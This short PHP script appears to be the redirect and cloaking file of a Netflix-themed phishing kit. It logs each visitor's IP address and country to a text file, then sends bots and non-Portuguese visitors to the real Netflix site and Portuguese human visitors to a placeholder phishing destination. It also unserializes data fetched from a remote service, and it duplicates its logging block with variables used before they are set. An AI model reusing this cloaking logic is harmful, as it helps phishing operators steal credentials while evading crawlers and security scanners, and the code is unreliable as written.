<?php
$file = 'vu.txt';
$current = file_get_contents($file);
$current .= 'IP: '.$ip_address.' - Country: '.$country."n";
file_put_contents($file, $current);
	$ip_address = $_SERVER['REMOTE_ADDR'];
	$url = "http://www.geoplugin.net/php.gp?ip=".$ip_address;
	$data = unserialize(file_get_contents($url));
	$country = $data['geoplugin_countryCode'];
$file = 'vu.txt';
$current = file_get_contents($file);
$current .= 'IP: '.$ip_address.' - Country: '.$country."n";
file_put_contents($file, $current);

	$is_bot = false;
	if(isset($_SERVER['HTTP_USER_AGENT'])) {
		$user_agent = $_SERVER['HTTP_USER_AGENT'];
		if(preg_match('/bot|crawl|slurp|spider|mediapartners/i', $user_agent)) {
			$is_bot = true;
		}
	}

	if ($is_bot || $country != "PT") {
		header("Location: https://www.netflix.com/");
		exit();
	} else if ($country == "PT" && !$is_bot) {
		header("Location: tazzzzzzzzzzzzzz");
		exit();
	}
?>
